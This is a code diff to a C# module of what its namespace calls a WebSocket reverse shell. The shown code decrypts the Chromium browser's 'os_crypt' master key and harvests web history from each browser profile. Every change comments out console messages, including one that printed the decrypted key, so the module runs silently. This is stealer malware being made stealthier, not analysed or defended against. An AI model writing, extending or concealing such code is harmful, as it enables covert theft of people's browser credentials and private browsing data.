@@ -129,7 +129,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                         // Convert the decrypted key to a string if needed
                         string decryptedKeyString = Encoding.UTF8.GetString(decryptedKeyBytes);
 
-                        Console.WriteLine($"decryptedKeyString: {decryptedKeyString}");
+                        /*Console.WriteLine($"decryptedKeyString: {decryptedKeyString}");*/
 
                         return decryptedKeyBytes;
 
@@ -137,18 +137,18 @@ namespace WebSocketReverseShellDotNet.service.commands
                     }
                     else
                     {
-                        Console.WriteLine("The 'encrypted_key' property does not exist in the 'os_crypt' object.");
+                        /*Console.WriteLine("The 'encrypted_key' property does not exist in the 'os_crypt' object.");*/
                     }
                 }
                 else
                 {
-                    Console.WriteLine("The 'os_crypt' property does not exist in the JSON document.");
+                    /*Console.WriteLine("The 'os_crypt' property does not exist in the JSON document.");*/
                 }
 
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+                /*Console.WriteLine(e.Message);*/
                 return [];
 
             }
@@ -167,7 +167,7 @@ namespace WebSocketReverseShellDotNet.service.commands
             else
             {
                 // Handle invalid startIndex (out of range)
-                Console.WriteLine("Invalid startIndex");
+                /*Console.WriteLine("Invalid startIndex");*/
                 return null;
             }
         }
@@ -206,7 +206,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                     ProcessWebHistoryData(connectionString, profileDir);
                 }
                 catch (Exception e) {
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 }
                
             }
@@ -223,7 +223,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 }
             }
 
@@ -238,7 +238,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.Message);
+                  /*  Console.WriteLine(e.Message);*/
                 }
             }
 
@@ -253,7 +253,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.Message);
+                   /* Console.WriteLine(e.Message);*/
                 }
             }
 
@@ -408,7 +408,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 }
                 catch (Exception e) 
                 {
-                    Console.WriteLine(e.Message);
+                   /* Console.WriteLine(e.Message);*/
                 
                  }
                 try {
@@ -444,7 +444,7 @@ namespace WebSocketReverseShellDotNet.service.commands
                 } 
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.Message);
+                    /*Console.WriteLine(e.Message);*/
                 }
 
 
